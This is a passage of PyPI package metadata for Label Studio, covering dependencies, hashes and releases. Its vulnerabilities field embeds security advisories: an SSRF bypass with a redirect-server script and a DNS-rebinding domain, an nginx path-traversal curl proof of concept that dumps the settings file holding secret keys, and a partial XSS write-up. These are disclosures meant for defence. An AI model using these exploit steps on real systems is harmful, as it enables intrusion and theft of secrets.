min==0.1.12","humansignal-drf-yasg>=1.21.9","jsonschema==3.2.0","label-studio-converter==0.0.58","launchdarkly-server-sdk==8.2.1","lockfile>=0.12.0","lxml>=4.2.5","mysqlclient; extra == \"mysql\"","numpy<2.0.0,>=1.24.3","openai<2.0.0,>=1.10.0","ordered-set==4.0.2","pandas>=0.24.0","psycopg2-binary==2.9.9","pydantic<=1.11.0,>=1.7.3","python-dateutil>=2.8.1","python-json-logger==2.0.4","pytz<2023.0,>=2022.1","pyyaml>=6.0.0","redis<4.0,>=3.5","requests==2.31.0","rq==1.10.1","rules==2.2","sentry-sdk>=1.1.0","ujson>=3.0.0","urllib3<2.0.0,>=1.26.18","wheel<=0.40.0,>=0.38.1","xmljson==0.2.0"],"requires_python":"<4,>=3.8","summary":"Label Studio annotation tool","version":"1.12.1","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"69ffde07efcb9e555077a9dd4f4fddd6692d5937d22b7026411e8afb7c35c475","md5":"ccca1a1806465381d7871be12be27e01","sha256":"b34f78f227f6dff71a042c1fa23995b1941143fc8d139637d2ef75e5cfe24a31"},"downloads":-1,"filename":"label_studio-1.12.1-py3-none-any.whl","has_sig":false,"md5_digest":"ccca1a1806465381d7871be12be27e01","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4,>=3.8","size":81591474,"upload_time":"2024-05-21T16:23:48","upload_time_iso_8601":"2024-05-21T16:23:48.361568Z","url":"https://files.pythonhosted.org/packages/69/ff/de07efcb9e555077a9dd4f4fddd6692d5937d22b7026411e8afb7c35c475/label_studio-1.12.1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"cee2c7acd81e24185d809eaf931d7354e1d7611a64b89d393d135a4b26541a06","md5":"b0a303ba52aaf0ea3015a992a34828c9","sha256":"12edefd370ac751d5fafa81cd58ea48977d65484a1e63c290764d6726d14ad65"},"downloads":-1,"filename":"label_studio-1.12.1.tar.gz","has_sig":false,"md5_digest":"b0a303ba52aaf0ea3015a992a34828c9","packagetype":"sdist","python_version":"source","requires_python":"<4,>=3.8","size":80182246,"upload_time":"2024-05-21T16:23:55","upload_time_iso_8601":"2024-05-21T16:23:55.956454Z","url":"https://files.pythonhosted.org/packages/ce/e2/c7acd81e24185d809eaf931d7354e1d7611a64b89d393d135a4b26541a06/label_studio-1.12.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"1.13.0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":null,"license":"Apache-2.0","maintainer":null,"maintainer_email":null,"name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.13.0/","requires_dist":["Django<3.3.0,>=3.2.24","appdirs>=1.4.3","attr==0.3.1","attrs>=19.2.0","azure-storage-blob>=12.6.0","bleach<5.1.0,>=5.0.0","boto<3.0.0,>=2.49.0","boto3<2.0.0,>=1.28.58","botocore<2.0.0,>=1.31.58","boxing>=0.1.4","colorama>=0.4.4","defusedxml>=0.7.1","django-annoying==0.10.6","django-cors-headers==3.6.0","django-csp==3.7","django-debug-toolbar==3.2.1","django-environ==0.10.0","django-extensions==3.1.0","django-filter==2.4.0","django-model-utils==4.1.1","django-ranged-fileresponse>=0.1.2","django-rq==2.5.1","django-storages==1.12.3","django-user-agents==0.4.0","djangorestframework==3.13.1","drf-dynamic-fields==0.3.0","drf-flex-fields==0.9.5","drf-generators==0.3.0","google-cloud-logging<4.0.0,>=3.10.0","google-cloud-storage<3.0.0,>=2.13.0","htmlmin==0.1.12","humansignal-drf-yasg>=1.21.9","jsonschema==3.2.0","label-studio-sdk==1.0.4","launchdarkly-server-sdk==8.2.1","lockfile>=0.12.0","lxml>=4.2.5","mysqlclient; extra == \"mysql\"","numpy<2.0.0,>=1.24.3","openai<2.0.0,>=1.10.0","ordered-set==4.0.2","pandas>=0.24.0","psycopg2-binary==2.9.9","pydantic>=2.7.3","python-dateutil>=2.8.1","python-json-logger==2.0.4","pytz<2023.0,>=2022.1","pyyaml>=6.0.0","redis<4.0,>=3.5","requests<2.33.0,>=2.32.3","rq==1.10.1","rules==2.2","sentry-sdk>=1.1.0","ujson>=3.0.0","urllib3<2.0.0,>=1.26.18","wheel<=0.40.0,>=0.38.1","xmljson==0.2.1"],"requires_python":"<4,>=3.8","summary":"Label Studio annotation tool","version":"1.13.0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"e37ff0acd3244f3a2dc901b73ebea186d3615e316621d8a90bf4247cc60b6c6c","md5":"500e237978f13224910e50fbbc02e3d0","sha256":"eb56070a4668a06656bf6cd01f7b8872a74a5b54564df3719b1dffc077a806b1"},"downloads":-1,"filename":"label_studio-1.13.0-py3-none-any.whl","has_sig":false,"md5_digest":"500e237978f13224910e50fbbc02e3d0","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4,>=3.8","size":82115062,"upload_time":"2024-07-31T14:50:12","upload_time_iso_8601":"2024-07-31T14:50:12.448410Z","url":"https://files.pythonhosted.org/packages/e3/7f/f0acd3244f3a2dc901b73ebea186d3615e316621d8a90bf4247cc60b6c6c/label_studio-1.13.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"9a7fbffdc4c2e8cf02ed14b789caf261d454a5ead38653b06155bb42c65d0ce2","md5":"a581d6b2fa5dc8716e0378bf1c82bb7b","sha256":"a80157940746d4ed187a2054fa38bffec743503d1acb7c274afed268f8f05d38"},"downloads":-1,"filename":"label_studio-1.13.0.tar.gz","has_sig":false,"md5_digest":"a581d6b2fa5dc8716e0378bf1c82bb7b","packagetype":"sdist","python_version":"source","requires_python":"<4,>=3.8","size":80680417,"upload_time":"2024-07-31T14:50:18","upload_time_iso_8601":"2024-07-31T14:50:18.297529Z","url":"https://files.pythonhosted.org/packages/9a/7f/bffdc4c2e8cf02ed14b789caf261d454a5ead38653b06155bb42c65d0ce2/label_studio-1.13.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"1.13.1":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":null,"license":"Apache-2.0","maintainer":null,"maintainer_email":null,"name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.13.1/","requires_dist":["Django<3.3.0,>=3.2.24","appdirs>=1.4.3","attr==0.3.1","attrs>=19.2.0","azure-storage-blob>=12.6.0","bleach<5.1.0,>=5.0.0","boto<3.0.0,>=2.49.0","boto3<2.0.0,>=1.28.58","botocore<2.0.0,>=1.31.58","boxing>=0.1.4","colorama>=0.4.4","defusedxml>=0.7.1","django-annoying==0.10.6","django-cors-headers==3.6.0","django-csp==3.7","django-debug-toolbar==3.2.1","django-environ==0.10.0","django-extensions==3.1.0","django-filter==2.4.0","django-model-utils==4.1.1","django-ranged-fileresponse>=0.1.2","django-rq==2.5.1","django-storages==1.12.3","django-user-agents==0.4.0","djangorestframework==3.13.1","drf-dynamic-fields==0.3.0","drf-flex-fields==0.9.5","drf-generators==0.3.0","google-cloud-logging<4.0.0,>=3.10.0","google-cloud-storage<3.0.0,>=2.13.0","htmlmin==0.1.12","humansignal-drf-yasg>=1.21.9","jsonschema==3.2.0","label-studio-sdk==1.0.5","launchdarkly-server-sdk==8.2.1","lockfile>=0.12.0","lxml>=4.2.5","mysqlclient; extra == \"mysql\"","numpy<2.0.0,>=1.24.3","openai<2.0.0,>=1.10.0","ordered-set==4.0.2","pandas>=0.24.0","psycopg2-binary==2.9.9","pydantic>=2.7.3","python-dateutil>=2.8.1","python-json-logger==2.0.4","pytz<2023.0,>=2022.1","pyyaml>=6.0.0","redis<4.0,>=3.5","requests<2.33.0,>=2.32.3","rq==1.10.1","rules==2.2","sentry-sdk>=1.1.0","ujson>=3.0.0","urllib3<2.0.0,>=1.26.18","wheel<=0.40.0,>=0.38.1","xmljson==0.2.1"],"requires_python":"<4,>=3.8","summary":"Label Studio annotation tool","version":"1.13.1","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"02d14db0730f7b53eaa22d7decab4155d00184e086363138552ff4594dcdf896","md5":"27399c9a664b0d319fcc677217a278c8","sha256":"ce99ae0f513c2cd29a41692bcd977bfd1c86605f1bc6840eda0735f58f717e10"},"downloads":-1,"filename":"label_studio-1.13.1-py3-none-any.whl","has_sig":false,"md5_digest":"27399c9a664b0d319fcc677217a278c8","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4,>=3.8","size":82362130,"upload_time":"2024-08-20T17:37:58","upload_time_iso_8601":"2024-08-20T17:37:58.795367Z","url":"https://files.pythonhosted.org/packages/02/d1/4db0730f7b53eaa22d7decab4155d00184e086363138552ff4594dcdf896/label_studio-1.13.1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"46fb39551034def05ab5556eee372b26623043f5e94ae20791c7a116fe282939","md5":"f527bad3650feb78a9354a5b1e246f03","sha256":"124b4e61a1c48f30de921b595b8c77c88532aa095233375691f0842690efc8e5"},"downloads":-1,"filename":"label_studio-1.13.1.tar.gz","has_sig":false,"md5_digest":"f527bad3650feb78a9354a5b1e246f03","packagetype":"sdist","python_version":"source","requires_python":"<4,>=3.8","size":80904815,"upload_time":"2024-08-20T17:38:07","upload_time_iso_8601":"2024-08-20T17:38:07.632038Z","url":"https://files.pythonhosted.org/packages/46/fb/39551034def05ab5556eee372b26623043f5e94ae20791c7a116fe282939/label_studio-1.13.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"1.14.0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.13","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":null,"license":"Apache-2.0","maintainer":null,"maintainer_email":null,"name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.14.0/","requires_dist":["Django<4.3.0,>=4.2.13","appdirs>=1.4.3","attr==0.3.1","attrs>=19.2.0","azure-storage-blob>=12.6.0","bleach<5.1.0,>=5.0.0","boto<3.0.0,>=2.49.0","boto3<2.0.0,>=1.28.58","botocore<2.0.0,>=1.31.58","boxing>=0.1.4","colorama>=0.4.4","defusedxml>=0.7.1","django-annoying==0.10.6","django-cors-headers==3.6.0","django-csp==3.7","django-debug-toolbar==3.2.1","django-environ==0.10.0","django-extensions==3.2.3","django-filter==2.4.0","django-migration-linter<6.0.0,>=5.1.0","django-model-utils==4.1.1","django-ranged-fileresponse>=0.1.2","django-rq==2.5.1","django-storages==1.12.3","django-user-agents==0.4.0","djangorestframework==3.15.2","drf-dynamic-fields==0.3.0","drf-flex-fields==0.9.5","drf-generators==0.3.0","google-cloud-logging<4.0.0,>=3.10.0","google-cloud-storage<3.0.0,>=2.13.0","humansignal-drf-yasg>=1.21.9","label-studio-sdk==1.0.7","launchdarkly-server-sdk==8.2.1","lockfile>=0.12.0","lxml[html-clean]>=4.9.4","mysqlclient; extra == \"mysql\"","numpy<2.0.0,>=1.26.4","openai<2.0.0,>=1.10.0","ordered-set==4.0.2","pandas>=2.2.3","psycopg2-binary==2.9.10","pydantic>=2.9.2","python-dateutil>=2.8.1","python-json-logger==2.0.4","pytz<2023.0,>=2022.1","pyyaml>=6.0.0","redis<4.0,>=3.5","requests<2.33.0,>=2.32.3","rq==1.10.1","rules==3.4","sentry-sdk>=2.16.0","ujson>=3.0.0","urllib3<2.0.0,>=1.26.18","wheel<=0.40.0,>=0.38.1","xmljson==0.2.1"],"requires_python":"<4,>=3.9","summary":"Label Studio annotation tool","version":"1.14.0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"695fc859cb3e555b5aa39ead5c26232bbdd06b31d86c9c06dff5a726eb0f7b95","md5":"3cd640a06ebb1a4d0e693aff2216f937","sha256":"5e023d6ade3750c9368b2fdcdd9ad27700d12cea7844170c6e26e1e26e39c84e"},"downloads":-1,"filename":"label_studio-1.14.0-py3-none-any.whl","has_sig":false,"md5_digest":"3cd640a06ebb1a4d0e693aff2216f937","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4,>=3.9","size":58441979,"upload_time":"2024-11-04T17:28:45","upload_time_iso_8601":"2024-11-04T17:28:45.227160Z","url":"https://files.pythonhosted.org/packages/69/5f/c859cb3e555b5aa39ead5c26232bbdd06b31d86c9c06dff5a726eb0f7b95/label_studio-1.14.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"13df88765b47a458a105b4f88da021604358eab8a5feb40457ad464901e93c7d","md5":"1c98f44b31e225a2d1390a08312481e0","sha256":"654c5a0962cbc6f97c7c27f97e3d02bd335581c728be8d28560409140ab32371"},"downloads":-1,"filename":"label_studio-1.14.0.tar.gz","has_sig":false,"md5_digest":"1c98f44b31e225a2d1390a08312481e0","packagetype":"sdist","python_version":"source","requires_python":"<4,>=3.9","size":56979650,"upload_time":"2024-11-04T17:28:49","upload_time_iso_8601":"2024-11-04T17:28:49.409025Z","url":"https://files.pythonhosted.org/packages/13/df/88765b47a458a105b4f88da021604358eab8a5feb40457ad464901e93c7d/label_studio-1.14.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"1.2":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.2/","requires_dist":["wheel","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (==2.49.0)","boto3 (==1.16.28)","botocore (==1.19.28)","google-cloud-storage (==1.28.1)","Django (==3.1.12)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.3.2)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","django-redis-cache (==3.0.0)","drf-dynamic-fields (==0.3.0)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","numpy (>=1.19.1)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.8.4)","pydantic (==1.7.3)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (<3,>=2.22.0)","rq (==1.7.0)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (>=3.5.0)","sentry-sdk (>=1.1.0)","label-studio-converter (==0.0.30)"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.2","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"2a7788a70a5818c8c3fae9c863c063a556ce76f635e86efc05a660a8b5a2ce3f","md5":"7bccab844ae6d633388eae5d6502147d","sha256":"a55cf4f6a1630a4479da937cc8a54701a04eabafc5c468ea04cc89e96e811d7e"},"downloads":-1,"filename":"label_studio-1.2-py3-none-any.whl","has_sig":false,"md5_digest":"7bccab844ae6d633388eae5d6502147d","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":46028851,"upload_time":"2021-08-18T16:21:18","upload_time_iso_8601":"2021-08-18T16:21:18.977787Z","url":"https://files.pythonhosted.org/packages/2a/77/88a70a5818c8c3fae9c863c063a556ce76f635e86efc05a660a8b5a2ce3f/label_studio-1.2-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"12d978d371dfe1c993043bdbb6153892631a9152c096b70b7e6a97134b2ee284","md5":"18286c483abd8aa6d9d837adbf693713","sha256":"cac6e2af78cf8edbdf38a6f68a2ac7e4edae8618d72fb1b4a816af2712970713"},"downloads":-1,"filename":"label-studio-1.2.tar.gz","has_sig":false,"md5_digest":"18286c483abd8aa6d9d837adbf693713","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":45309421,"upload_time":"2021-08-18T16:22:25","upload_time_iso_8601":"2021-08-18T16:22:25.795551Z","url":"https://files.pythonhosted.org/packages/12/d9/78d371dfe1c993043bdbb6153892631a9152c096b70b7e6a97134b2ee284/label-studio-1.2.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or 